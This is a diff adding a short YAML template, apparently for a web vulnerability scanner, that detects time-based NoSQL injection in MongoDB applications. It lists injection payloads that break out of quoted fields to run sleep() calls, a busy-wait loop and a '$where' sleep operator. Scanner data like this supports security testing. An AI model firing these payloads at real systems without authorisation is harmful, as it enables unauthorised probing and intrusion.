@@ -1,0 +1,17 @@
+id: "mongo-time"
+issue_code: nosql_injection
+detection_conditions: or
+detection_methods:
+  - time_based:
+      sleep: "{{.sleep_time}}"
+templates:
+  - "';sleep({{.sleep_time}});"
+  - "';it=new%20Date();do{pt=new%20Date();}while(pt-it<{{.sleep_time}});"
+  - '{"$where":  "sleep({{.sleep_time}})"}'
+  - "';sleep({{.sleep_time}});'"
+  - "';sleep({{.sleep_time}});+'"
+vars:
+  - name: "sleep_time"
+    value: "{{randomInt 5000 9000}}"
+categories:
+  - nosqli
